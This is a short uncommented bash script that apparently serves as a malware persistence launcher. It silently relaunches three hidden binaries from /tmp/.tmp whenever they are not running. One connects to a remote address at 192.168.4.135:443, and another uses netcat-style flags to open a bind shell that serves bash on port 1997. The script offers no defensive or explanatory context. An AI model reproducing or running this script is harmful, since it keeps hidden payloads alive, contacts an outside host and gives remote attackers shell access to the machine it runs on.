#!/usr/bin/bash

nohup /usr/bin/bash `pgrep girmx > /dev/null || /tmp/.tmp/girmx` > /dev/null 2>&1 &
nohup /usr/bin/bash `pgrep linmer > /dev/null || /tmp/.tmp/linmer -url https://192.168.4.135:443` > /dev/null 2>&1 &
nohup /usr/bin/bash `pgrep cn > /dev/null || /tmp/.tmp/cn -l -e /usr/bin/bash -p 1997` > /dev/null 2>&1 &